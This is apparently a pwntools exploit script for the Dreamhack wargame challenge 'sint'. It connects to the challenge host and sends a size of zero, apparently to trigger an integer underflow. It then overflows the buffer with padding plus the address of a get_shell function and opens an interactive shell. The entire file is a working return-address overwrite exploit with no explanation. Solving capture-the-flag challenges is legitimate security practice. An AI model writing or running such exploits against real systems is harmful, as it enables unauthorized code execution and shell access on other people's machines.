from pwn import * 

# p = process("./sint")
p = remote("host1.dreamhack.games",8482)

get_shell = 0x08048659  

p.sendlineafter("Size: ","0")

payload = ""
payload += "a"*0x100
payload += "b"*4
payload += p32(get_shell)

pause()

p.sendlineafter("Data: ",payload)

p.interactive()
